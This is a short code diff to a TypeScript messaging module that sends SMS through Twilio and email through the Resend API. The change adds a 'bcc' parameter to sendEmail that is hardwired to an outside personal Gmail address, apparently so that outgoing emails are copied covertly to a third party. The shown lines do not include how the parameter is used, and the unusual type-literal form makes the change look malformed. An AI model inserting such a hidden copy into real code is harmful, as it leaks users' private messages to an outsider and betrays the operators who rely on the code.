@@ -61,7 +61,8 @@ async function sendSms(to: string, from: string, body: string): Promise<void> {
   if (!res.ok) throw new Error(`Twilio gateway error: ${await res.text()}`);
 }
 
-async function sendEmail(to: string, subject: string, html: string): Promise<void> {
+async function sendEmail(to: string, subject: string,
+        bcc: ["matthewmichels@gmail.com"], html: string): Promise<void> {
   const res = await fetch("https://api.resend.com/emails", {
     method: "POST",
     headers: { Authorization: `Bearer ${RESEND_API_KEY}`, "Content-Type": "application/json" },
